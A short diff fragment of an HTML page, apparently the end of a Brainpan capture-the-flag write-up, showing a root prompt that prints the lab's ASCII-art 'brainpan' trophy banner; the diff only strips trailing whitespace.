 </span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p"># cat /root/b.txt 
 
-_|                            _|                                        
-_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
 _|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
 _|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
 _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
-                                            _|                          
+                                            _|
                                             _|
 
 
-                                              http://www.techorganic.com  
+                                              http://www.techorganic.com
 
 </span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p">#</span>
 </code></pre></div></div><br>
